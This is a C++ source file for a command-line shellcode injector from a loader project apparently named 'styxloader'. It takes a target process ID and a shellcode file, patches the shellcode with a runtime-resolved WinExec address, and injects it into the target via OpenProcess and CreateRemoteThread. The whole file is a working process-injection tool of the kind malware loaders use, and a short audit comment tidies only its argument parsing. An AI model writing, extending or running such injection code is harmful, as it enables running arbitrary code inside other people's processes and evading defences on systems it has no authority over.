#include "styxloader/simple_injector.hpp"
#include "styxloader/shellcode.hpp"

#include <windows.h>
#include <iostream>
#include <string>

// Standalone tool for basic CreateRemoteThread injection.
// Useful for testing/baseline comparison without the full main_loader.
//
// Usage:
//   simple_injector_tool.exe <Target Process PID> <Path to shellcode.bin>
//
// Audit note: the original SimpleInjector.cpp used atoi(argv[1]) with no
// validation — atoi("abc") returns 0 silently, leading to OpenProcess
// failures with no useful message. Replaced with std::stoul + try/catch.
int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: simple_injector_tool.exe <Target Process PID> <Path to shellcode.bin>" << std::endl;
        return 1;
    }

    DWORD pid = 0;
    try {
        pid = static_cast<DWORD>(std::stoul(argv[1]));
    } catch (const std::exception&) {
        std::cout << "Error: '" << argv[1] << "' is not a valid PID." << std::endl;
        return 1;
    }
    const char* shellcodePath = argv[2];

    auto shellcode = styxloader::ReadShellcode(shellcodePath);
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        return 1;
    }

    // Patch shellcode with the runtime-resolved WinExec address (commit 6).
    // The shellcode.asm layout reserves the first 8 bytes for this address.
    if (!styxloader::PatchShellcodeWinExec(shellcode)) {
        std::cout << "Error: failed to patch shellcode with WinExec address." << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                  PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProcess) {
        std::cout << "Error opening process (GetLastError=" << GetLastError() << ")." << std::endl;
        return 1;
    }

    bool success = styxloader::SimpleInject(hProcess, shellcode.data(), shellcode.size());

    CloseHandle(hProcess);
    std::cout << (success ? "Injection successful." : "Injection failed.") << std::endl;
    return success ? 0 : 1;
}
